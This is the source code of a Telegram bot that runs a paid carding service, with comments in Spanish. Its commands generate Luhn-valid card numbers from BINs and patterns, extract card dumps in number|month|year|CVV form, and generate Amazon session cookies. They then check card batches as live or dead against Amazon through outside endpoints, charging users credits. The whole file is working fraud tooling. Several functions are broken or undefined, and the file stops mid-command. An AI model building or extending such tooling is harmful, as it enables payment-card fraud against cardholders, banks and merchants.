// ============================================
// BOT DE TELEGRAM - CIBERTERRORISTAS CHK
// Versión mejorada con todos los comandos intuitivos
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

// ========== CONFIGURACIÓN ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const INTERNAL_API_URL = process.env.INTERNAL_API_URL || 'http://basedatos:8080/api';
const BOT_API_KEY = process.env.BOT_API_KEY || 'AALOL23894238HWKEJSNFSDGF';
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL || 'https://p01--gencookie--7ppzd7xy487n.code.run';
const API_EXTRAPOLADOR_URL = process.env.API_EXTRAPOLADOR_URL || 'https://p01--extrapolador--7ppzd7xy487n.code.run';
const API_AMAZON_CHECK_URL = process.env.API_AMAZON_CHECK_URL || 'https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card';
const API_LATTICE_URL = process.env.API_LATTICE_URL || 'https://api.lattice.com/check'; // Ejemplo
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID; // Ej: -1001234567890

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram mejorado iniciado');

// ========== SEPARADORES BONITOS (array aleatorio) ==========
const SEPARATORS = [
    '𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟',
    '⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆',
    '𓆩༺✧༻𓆪  𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪',
    '𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆',
    '🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･',
    'ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔',
    '✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐',
    '🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻',
    '🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖',
    '🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨'
];

// ========== GESTIÓN DE ESTADOS POR USUARIO ==========
// Cada usuario puede tener un estado: { step, timeout, data }
const userStates = new Map();

function setUserState(telegramId, state) {
    if (userStates.has(telegramId)) {
        clearTimeout(userStates.get(telegramId).timeout);
    }
    const timeout = setTimeout(() => {
        if (userStates.get(telegramId)?.step) {
            userStates.delete(telegramId);
            bot.sendMessage(telegramId, '⏰ Tiempo de espera agotado. Envía el comando de nuevo si lo necesitas.')
                .catch(() => {});
        }
    }, 300000); // 5 minutos
    userStates.set(telegramId, { ...state, timeout });
}

function clearUserState(telegramId) {
    const state = userStates.get(telegramId);
    if (state?.timeout) clearTimeout(state.timeout);
    userStates.delete(telegramId);
}

// ========== FUNCIONES DE BASE DE DATOS ==========
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining, cookie FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

async function upsertUser(telegramId, username, chatId, chatType) {
    if (chatType !== 'private') return;
    const now = new Date();
    const client = await pool.connect();
    try {
        await client.query('BEGIN');
        await client.query(`UPDATE users SET telegram_chat_id = NULL WHERE telegram_chat_id = $1`, [chatId]);
        const existing = await client.query('SELECT id FROM users WHERE telegram_id = $1', [telegramId]);
        if (existing.rows.length > 0) {
            await client.query(
                `UPDATE users SET telegram_chat_id = $1, telegram_username = $2, updated_at = $3 WHERE telegram_id = $4`,
                [chatId, username, now, telegramId]
            );
        } else {
            const byUsername = await client.query('SELECT id FROM users WHERE username = $1', [username]);
            if (byUsername.rows.length > 0) {
                await client.query(
                    `UPDATE users SET telegram_id = $1, telegram_chat_id = $2, telegram_username = $3, updated_at = $4 WHERE username = $5`,
                    [telegramId, chatId, username, now, username]
                );
            } else {
                await client.query(
                    `INSERT INTO users (telegram_id, telegram_username, telegram_chat_id, username, created_at) VALUES ($1, $2, $3, $4, $5)`,
                    [telegramId, username, chatId, username, now]
                );
            }
        }
        await client.query('COMMIT');
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error en upsertUser:', error);
    } finally {
        client.release();
    }
}

async function updateUserCookie(telegramId, cookie) {
    await pool.query(`UPDATE users SET cookie = $1 WHERE telegram_id = $2`, [cookie, telegramId]);
}

async function deductCredits(telegramId, amount = 4) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 180000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, amount, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) {
            return { newCredits: data.newCredits, creditsZero: data.credits_zero || false, role: data.role };
        }
        return null;
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}

async function checkAndKickIfNoDaysOrCredits(telegramId, chatId, requiredCredits = 0) {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
        await sendSafeMessage(chatId, '❌ Usa /start primero.');
        return false;
    }
    if (user.days_remaining <= 0) {
        if (GROUP_CHAT_ID) await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramId).catch(() => {});
        await sendSafeMessage(chatId, '❌ Tus días han expirado. Has sido expulsado del grupo.');
        return false;
    }
    if (requiredCredits > 0 && user.credits < requiredCredits) {
        await sendSafeMessage(chatId, `❌ Créditos insuficientes. Necesitas: ${requiredCredits}.`);
        return false;
    }
    return true;
}

// ========== FUNCIONES DE UTILIDAD ==========
async function sendSafeMessage(chatId, text, options = {}) {
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        if (options.parse_mode) {
            delete options.parse_mode;
            try { return await bot.sendMessage(chatId, text, options); } catch (e) {}
        }
        return null;
    }
}

function calcularDigitoLuhn(numeroParcial) {
    let suma = 0, esPar = true;
    for (let i = numeroParcial.length - 1; i >= 0; i--) {
        let digito = parseInt(numeroParcial[i]);
        if (esPar) {
            digito *= 2;
            if (digito > 9) digito -= 9;
        }
        suma += digito;
        esPar = !esPar;
    }
    return (10 - (suma % 10)) % 10;
}

function limpiarTarjetas(textoSucio) {
    const textoLimpio = textoSucio
        .replace(/[\u200b\u2060\u200C\u200D\uFEFF]/g, '')
        .replace(/\s+/g, ' ')
        .replace(/\[.*?\]/g, '')
        .replace(/\(.*?\)/g, '')
        .trim();
    const patron = /(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/g;
    const tarjetas = [];
    let match;
    while ((match = patron.exec(textoLimpio)) !== null) {
        const [_, num, mes, año, cvv] = match;
        if (num.length === 16 && mes.length === 2 && año.length === 4 && cvv.length === 3) {
            tarjetas.push(`${num}|${mes}|${año}|${cvv}`);
        }
    }
    return [...new Set(tarjetas)];
}

function normalizarExtra(texto) {
    // Si ya tiene pipes, devolver igual
    if (texto.includes('|')) return texto;
    // Reemplazar espacios, guiones, barras por pipe
    let temp = texto.replace(/[ /-]+/g, '|');
    // Si después de reemplazar sigue sin pipes, puede ser un formato compacto
    if (!temp.includes('|')) {
        // Buscar patrón: digitos/X + 2 digitos mes + 4 digitos año + 3 dígitos cvv (opcional)
        const match = temp.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            return `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }
    return temp;
}

function generarTarjetasDesdePatron(patron, cantidad = 10) {
    // Normalizar el patrón: reemplazar separadores comunes por '|'
    let normalizado = patron.trim();
    // Si hay espacios, convertir a pipe
    normalizado = normalizado.replace(/[ /-]+/g, '|');
    // Si no hay pipes pero hay formato MMYYYY pegado, separar (ej: 40115405X054092028)
    if (!normalizado.includes('|') && /[0-9X]{6,16}\d{4,6}/.test(normalizado)) {
        // Caso: numero + MMYYYY + CVV (opcional)
        let match = normalizado.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            normalizado = `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }

    const partes = normalizado.split('|');
    if (partes.length < 3) throw new Error('Formato inválido. Usa: NUMERO|MES|AÑO|CVV (CVV opcional)');

    let [numBase, mes, año, cvv] = partes;
    
    // Validar y normalizar mes
    mes = mes.padStart(2, '0').slice(0, 2);
    if (isNaN(parseInt(mes)) || parseInt(mes) < 1 || parseInt(mes) > 12) {
        throw new Error('Mes inválido (01-12)');
    }
    
    // Normalizar año (2 o 4 dígitos)
    año = año.trim();
    if (año.length === 2) año = '20' + año;
    if (año.length !== 4 || isNaN(parseInt(año))) throw new Error('Año inválido (YYYY o YY)');
    
    // Completar número base hasta 16 caracteres con X si es necesario
    numBase = numBase.toUpperCase();
    if (numBase.length > 16) throw new Error('El número base no puede tener más de 16 caracteres');
    if (numBase.length < 16) {
        // Rellenar con X hasta 16
        numBase = numBase + 'X'.repeat(16 - numBase.length);
    }
    // Verificar que solo contenga dígitos o X
    if (!/^[0-9X]+$/.test(numBase)) throw new Error('El patrón solo puede contener dígitos y X');
    
    const tarjetas = [];
    for (let i = 0; i < cantidad; i++) {
        let numeroConX = '';
        for (let char of numBase) {
            if (char === 'X') {
                numeroConX += Math.floor(Math.random() * 10).toString();
            } else {
                numeroConX += char;
            }
        }
        // Calcular dígito de Luhn para los primeros 15 dígitos
        const primeros15 = numeroConX.slice(0, 15);
        const digitoControl = calcularDigitoLuhn(primeros15);
        const numeroCompleto = primeros15 + digitoControl;
        
        let cvvGen = 'rnd';
        if (cvv && cvv.toLowerCase() !== 'rnd') {
            cvvGen = cvv.slice(0, 3);
            if (!/^\d{3}$/.test(cvvGen)) cvvGen = Math.floor(100 + Math.random() * 900).toString();
        } else {
            cvvGen = Math.floor(100 + Math.random() * 900).toString();
        }
        tarjetas.push(`${numeroCompleto}|${mes}|${año}|${cvvGen}`);
    }
    return tarjetas;
}

// ========== COMANDOS BASE ==========
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const firstName = from.first_name || '';
    const chatType = msg.chat.type;

    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;
        await upsertUser(telegramId, username, chatId, chatType);
        if (isNew) {
            await sendSafeMessage(chatId, 
                `👋 ¡Hola ${firstName}! 👋\n\n` +
                `He guardado tu Chat ID: <code>${telegramId}</code>\n\n` +
                `Regístrate en la web: https://astralchk.com/login.html con usuario @${username}\n` +
                `Recibirás un código aquí.`, { parse_mode: 'HTML' });
        } else {
            await sendSafeMessage(chatId,
                `👋 ¡Hola ${firstName}!\n💰 Créditos: ${existing.credits}\n📅 Días: ${existing.days_remaining}\n\n` +
                `Usa /menu para ver comandos.`, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error(error);
        await sendSafeMessage(chatId, '❌ Error interno.');
    }
});

// ========== COMANDO /BINLIST (y alias) ==========
const binlistRegex = /^\/(?:binlist|bins|list|binl|bnl)(?:\s+(.+))?/i;
bot.onText(binlistRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let query = match[1];
    
    // Modo interactivo si no hay query
    if (!query) {
        setUserState(telegramId, { step: 'awaiting_binlist_query' });
        return sendSafeMessage(chatId, '🏦 Ingresa el nombre de un banco (ej. Banorte, BBVA) o un país (ej. México, Colombia):');
    }
    
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    
    await sendSafeMessage(chatId, `🔍 Buscando bins para: ${query}...`);
    try {
        // Simulación de API de binlist (reemplazar con llamada real)
        // En realidad aquí deberías llamar a una API que devuelva bins por banco/pais
        const binsEjemplo = ['415231', '415231', '557910', '554718']; // Datos dummy
        const creditos = binsEjemplo.slice(0, 5);
        const debitos = binsEjemplo.slice(5);
        let msgText = `📋 *Bins encontrados para ${query}:*\n\n`;
        if (creditos.length) msgText += `💳 *CRÉDITO:*\n${creditos.join(', ')}\n\n`;
        if (debitos.length) msgText += `💳 *DÉBITO:*\n${debitos.join(', ')}`;
        await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// ========== COMANDO /EXTRAPOLADOR (y alias) ==========
const extrapoladorRegex = /^\/(?:extrapolador|extrapolado|extrapolad|extrapolar|extrapola|extrapol|extrapo|extrap|extras|extra|expo|exp|ext|xtr|xtrp|scrapper|scrapp|scrp)(?:\s+(.+))?/i;
bot.onText(extrapoladorRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let input = match[1];
    
    if (!input) {
        setUserState(telegramId, { step: 'awaiting_extrapolador_input' });
        return sendSafeMessage(chatId, '🔢 Envía un BIN de 6 dígitos, nombre de banco o país para extrapolar:');
    }
    
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 10)) return;
    
    let bin = input;
    // Si input no es numérico de 6 dígitos, asumimos que es banco/pais -> llamar a binlist primero
    if (!/^\d{6}$/.test(input)) {
        await sendSafeMessage(chatId, `🔍 Obteniendo bins de ${input}...`);
        // 🔁 Aquí deberías llamar a tu API real de binlist.
        // Por ahora simulamos con datos de ejemplo.
        const bins = ['415231', '557910']; // dummy
        if (bins.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron bins.');
        bin = bins[0]; // elegir el primero
        await sendSafeMessage(chatId, `✅ Usando BIN: ${bin}`);
    }
    
    await sendSafeMessage(chatId, `🔮 Extrapolando para BIN ${bin}...`);

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 180000); // 60 segundos

        // ✅ Llamada CORRECTA a la API de extrapolador (Puppeteer)
        const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bin: bin }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`HTTP ${response.status}: ${errorText.substring(0, 100)}`);
        }

        const data = await response.json();
        if (!data.success || !data.data || data.data.length === 0) {
            return await sendSafeMessage(chatId, `❌ No se encontraron tarjetas para BIN ${bin}.`);
        }

        // ===== EXTRAER PATRONES =====
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            const mes = partes[1];
            const año = partes[2];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0, 12);
            const clave = `${prefix}xxxx|${mes}|${año}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }

        if (Object.keys(patrones).length === 0) {
            return await sendSafeMessage(chatId, '❌ No se pudieron extraer patrones.');
        }

        // ===== CLASIFICAR =====
        const muy = [], mod = [], uni = [];
        for (const [patron, count] of Object.entries(patrones)) {
            if (count >= 3) muy.push({ patron, count });
            else if (count === 2) mod.push({ patron, count });
            else uni.push({ patron, count });
        }
        muy.sort((a, b) => b.count - a.count);
        mod.sort((a, b) => b.count - a.count);
        uni.sort((a, b) => b.count - a.count);

        // ===== CONSTRUIR MENSAJE =====
        let mensaje = `=== EXTRAPOLADOR - RESULTADOS ===\n\n`;
        if (muy.length) {
            mensaje += `🟢 PATRONES MUY REPETIDOS (${muy.length}):\n==================================================\n`;
            for (const p of muy.slice(0, 15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (muy.length > 15) mensaje += `... y ${muy.length - 15} más.\n`;
            mensaje += `\n`;
        }
        if (mod.length) {
            mensaje += `🟡 PATRONES MODERADOS (${mod.length}):\n==================================================\n`;
            for (const p of mod.slice(0, 15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (mod.length > 15) mensaje += `... y ${mod.length - 15} más.\n`;
            mensaje += `\n`;
        }
        if (uni.length) {
            mensaje += `🔴 PATRONES ÚNICOS (${uni.length}):\n==================================================\n`;
            for (const p of uni.slice(0, 20)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} vez)\n`;
            }
            if (uni.length > 20) mensaje += `... y ${uni.length - 20} más.\n`;
        }
        if (mensaje.length > 4090) mensaje = mensaje.substring(0, 4000) + "\n... (truncado)";

        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });

        // ===== DESCONTAR CRÉDITOS =====
        const creditResult = await deductCredits(telegramId, 10);
        if (creditResult?.creditsZero) {
            await kickUserFromGroup(telegramId);
            await sendSafeMessage(chatId, '⚠️ Has llegado a 0 créditos. Has sido expulsado del grupo.');
        }
    } catch (error) {
        console.error(error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});




















// ========== COMANDO /GEN (y alias) ==========
const genRegex = /^\/(?:generadorccs|genccs|gen|gncc)(?:\s+(.+))?/i;
bot.onText(genRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let param = match[1];
    
    if (!param) {
        setUserState(telegramId, { step: 'awaiting_gen_param' });
        return sendSafeMessage(chatId, '🎴 Envía un "extra" (ej. 40115405013XXXXX|05|2029|XXX), un BIN de 6 dígitos o nombre de banco:');
    }
    
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
    
    // Detectar si param es un extra (contiene | y X o dígitos)
    const esExtra = param.includes('|') && /[0-9X]+\|\d{2}\|\d{2,4}/.test(param);
    const esBin = /^\d{6}$/.test(param);
    const esBanco = !esExtra && !esBin;
    
    try {
        let patron = null;
        // Paso 1: si es banco -> obtener bins y elegir uno
        if (esBanco) {
            await sendSafeMessage(chatId, `🔍 Buscando bins de ${param}...`);
            // Simular obtención de bins
            const bins = ['415231', '557910']; // dummy
            if (bins.length === 0) throw new Error('No se encontraron bins');
            const binElegido = bins[0];
            await sendSafeMessage(chatId, `✅ BIN elegido: ${binElegido}`);
            // Paso 2: extrapolar desde ese bin
            await sendSafeMessage(chatId, `🔮 Extrapolando desde ${binElegido}...`);
            const extrapolado = await fetch(`${API_EXTRAPOLADOR_URL}/extrapolate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bin: binElegido })
            }).then(r => r.json());
            if (!extrapolado.success || !extrapolado.patterns.length) throw new Error('No se pudo extrapolar');
            // Elegir primer patrón
            const primerPatron = extrapolado.patterns[0];
            patron = `${primerPatron.prefix}xxxx|${primerPatron.mes}|${primerPatron.año}|rnd`;
            await sendSafeMessage(chatId, `📌 Patrón generado: \`${patron}\``, { parse_mode: 'Markdown' });
        } 
        else if (esBin) {
            // Solo bin: hacer extrapolación y luego generar
            await sendSafeMessage(chatId, `🔮 Extrapolando desde BIN ${param}...`);
            const extrapolado = await fetch(`${API_EXTRAPOLADOR_URL}/extrapolate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bin: param })
            }).then(r => r.json());
            if (!extrapolado.success || !extrapolado.patterns.length) throw new Error('No se pudo extrapolar');
            const primerPatron = extrapolado.patterns[0];
            patron = `${primerPatron.prefix}xxxx|${primerPatron.mes}|${primerPatron.año}|rnd`;
            await sendSafeMessage(chatId, `📌 Patrón generado: \`${patron}\``, { parse_mode: 'Markdown' });
        } 
        else {
            // Es extra directo
            patron = param;
        }
        
        // Paso 3: generar tarjetas
        const cantidad = 10; // por defecto, se podría pedir
        patron = normalizarExtra(patron);

        const tarjetas = generarTarjetasDesdePatron(patron, cantidad);
        const lista = tarjetas.slice(0, 20).map(t => `\`${t}\``).join('\n');
        await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
        
        // Descontar créditos
        const creditResult = await deductCredits(telegramId, 4);
        if (creditResult?.creditsZero) {
            if (GROUP_CHAT_ID) await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramId).catch(() => {});
            await sendSafeMessage(chatId, '⚠️ Llegaste a 0 créditos. Has sido expulsado.');
        }
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// ========== COMANDO /GENCOOKIE (paso 5) ==========
const genCookieRegex = /^\/(?:gencookie|gencuki|genck|gnck)(?:\s+(\w+))?/i;
bot.onText(genCookieRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let country = match[1] ? match[1].toUpperCase() : null;
    
    if (!country) {
        setUserState(telegramId, { step: 'awaiting_gencookie_country' });
        return sendSafeMessage(chatId, '🌎 ¿Para qué país? (MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN)');
    }
    
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
    
    const paisesValidos = ['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'];
    if (!paisesValidos.includes(country)) {
        return sendSafeMessage(chatId, '❌ País inválido. Opciones: MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN');
    }
    
    await sendSafeMessage(chatId, `🔄 Generando cookie para ${country}... (hasta 5 min)`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 300000);
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ country, add_address: true }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (!data.success || !data.data) throw new Error(data.error || 'Error generando cookie');
        const { phone, password, cookie_string, country: ctry } = data.data;
        
        // Guardar cookie en DB
        await updateUserCookie(telegramId, cookie_string);
        
        // Descontar créditos
        const creditResult = await deductCredits(telegramId, 4);
        let msgText = `🍪 *Cookie ${ctry}* generada y guardada (válida 10 min)\n📞 Tel: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 Cookie guardada en tu perfil.`;
        if (creditResult) msgText += `\n💰 Créditos restantes: ${creditResult.newCredits}`;
        if (creditResult?.creditsZero) {
            if (GROUP_CHAT_ID) await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramId).catch(() => {});
            msgText += '\n⚠️ Has llegado a 0 créditos. Has sido expulsado.';
        }
        await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// ========== COMANDO /SETCOOKIE (paso 6) ==========
const setCookieRegex = /^\/(?:setcookie|setcuki|stck|sck|setck|addcookie|addcuki|addck|dck|ack)(?:\s+(.+))?/i;
bot.onText(setCookieRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let cookie = match[1];
    
    if (!cookie) {
        setUserState(telegramId, { step: 'awaiting_setcookie' });
        return sendSafeMessage(chatId, '🍪 Envía la cookie (string largo) para guardar en tu perfil:');
    }
    
    await updateUserCookie(telegramId, cookie);
    await sendSafeMessage(chatId, '✅ Cookie guardada correctamente. Se usará automáticamente en /amazon.');
    clearUserState(telegramId);
});

// ========== FUNCIÓN PARA VERIFICAR TARJETAS EN AMAZON ==========
async function verificarTarjetasAmazonConCookie(tarjetas, cookie, chatId, telegramId) {
    const resultados = [];
    for (const card of tarjetas) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 180000);
            const response = await fetch(API_AMAZON_CHECK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies: cookie }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            resultados.push({ card, status: data.status, message: data.message });
        } catch (error) {
            resultados.push({ card, status: 'ERROR', message: error.message });
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    return resultados;
}

// ========== COMANDO /AMAZON (paso 7) ==========
const amazonRegex = /^\/(?:amazon|amz)(?:\s+(.+))?/i;
bot.onText(amazonRegex, async (msg, match) => {
 const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const user = await getUserByTelegramId(telegramId);
    if (!user) return sendSafeMessage(chatId, '❌ Usa /start primero.');
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;

    let cookie = user.cookie;
    if (!cookie) {
        const ask = await sendSafeMessage(chatId, '🔑 No tienes cookie guardada. ¿Quieres obtener una nueva? (cuesta 4 créditos)\nResponde "si" o "no".', {
            reply_markup: { inline_keyboard: [[{ text: '✅ Sí, generar cookie', callback_data: 'gencookie_for_amazon' }]] }
        });
        const respuesta = await new Promise(resolve => {
            const handler = (resp) => {
                if (resp.chat.id === chatId && (resp.text?.toLowerCase() === 'si' || resp.text?.toLowerCase() === 'no')) {
                    bot.removeListener('message', handler);
                    resolve(resp.text.toLowerCase());
                }
            };
            bot.on('message', handler);
            setTimeout(() => resolve(null), 60000);
        });
        if (respuesta !== 'si') return sendSafeMessage(chatId, '❌ Operación cancelada.');
        // Generar cookie automáticamente
        await sendSafeMessage(chatId, '🔄 Generando cookie... (puede tardar)');
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const data = await response.json();
            if (!data.success) throw new Error('No se pudo generar cookie');
            cookie = data.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            if (!creditResult) throw new Error('Fallo en descuento de créditos');
            await sendSafeMessage(chatId, `✅ Cookie generada y guardada. Créditos restantes: ${creditResult.newCredits}`);
        } catch (err) {
            return sendSafeMessage(chatId, `❌ Error generando cookie: ${err.message}`);
        }
    }

    let tarjetas = [];
    let param = match[1];
    
    if (!param) {
        // Modo interactivo: pedir tarjetas
        setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        return sendSafeMessage(chatId, '💳 Envía las tarjetas (formato texto sucio, patrón extra o BIN de 6 dígitos):');
    }

    // Detectar tipo de entrada
    const esBin = /^\d{6}$/.test(param);
    const esExtra = param.includes('|') && /[0-9X]+\|\d{2}\|\d{2,4}/.test(param);
    
    try {
        if (esBin) {
            // 1. Obtener tarjetas mediante extrapolador
            await sendSafeMessage(chatId, `🔮 Extrapolando desde BIN ${param}...`);
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 180000);
            const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bin: param }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const responseText = await response.text();
            let data;
            try {
                data = JSON.parse(responseText);
            } catch (e) {
                throw new Error('El servidor de extrapolador no devolvió JSON válido.');
            }
            if (!response.ok || !data.success || !data.data || data.data.length === 0) {
                throw new Error(`No se encontraron tarjetas para el BIN ${param}`);
            }
            tarjetas = data.data; // array de strings "16digitos|MM|YYYY|CVV"
            if (tarjetas.length === 0) throw new Error('No se generaron tarjetas.');
        } 
        else if (esExtra) {
            // 2. Generar tarjetas desde patrón
            const cantidad = 10; // o podrías permitir especificar cantidad
            tarjetas = generarTarjetasDesdePatron(param, cantidad);
        } 
        else {
            // 3. Limpiar texto sucio
            tarjetas = limpiarTarjetas(param);
        }

        if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas válidas.');
        if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);

        await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas con Amazon...`);
        const resultados = await verificarTarjetasAmazon(tarjetas, cookie);
        
        // Mostrar resultados con separador aleatorio
        const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
        let resumen = `${separador}\n`;
        for (const r of resultados) {
            const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
            resumen += `• Card: ${r.card}\n• Status: ${r.status} ${emoji}\n${separador}\n`;
        }
        if (resumen.length > 4096) resumen = resumen.substring(0, 4000) + '...';
